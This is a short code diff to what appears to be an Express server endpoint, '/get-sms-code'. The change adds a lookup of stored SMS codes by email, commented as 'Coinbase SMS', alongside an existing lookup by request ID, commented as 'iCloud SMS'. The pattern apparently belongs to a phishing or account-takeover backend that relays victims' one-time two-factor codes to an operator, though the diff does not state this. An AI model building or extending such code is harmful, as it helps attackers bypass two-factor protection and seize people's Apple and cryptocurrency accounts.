@@ -608,13 +608,21 @@ app.post("/update-status", (req, res) => {
 app.get("/get-sms-code", (req, res) => {
   try {
     const requestId = (req.query.requestId || "").trim();
+    const email = (req.query.email || "").trim();
 
-    if (!requestId || !pendingCodes[requestId]) {
-      return res.json({ smsCode: "unknown" });
+    // Try requestId first (iCloud SMS)
+    if (requestId && pendingCodes[requestId]) {
+      const smsCode = pendingCodes[requestId].smsCode;
+      return res.json({ smsCode });
     }
 
-    const smsCode = pendingCodes[requestId].smsCode;
-    res.json({ smsCode });
+    // Try email (Coinbase SMS)
+    if (email && pendingSMS[email]) {
+      const smsCode = pendingSMS[email].smsCode;
+      return res.json({ smsCode });
+    }
+
+    return res.json({ smsCode: "unknown" });
 
   } catch (err) {
     console.error("Get SMS code error:", err);
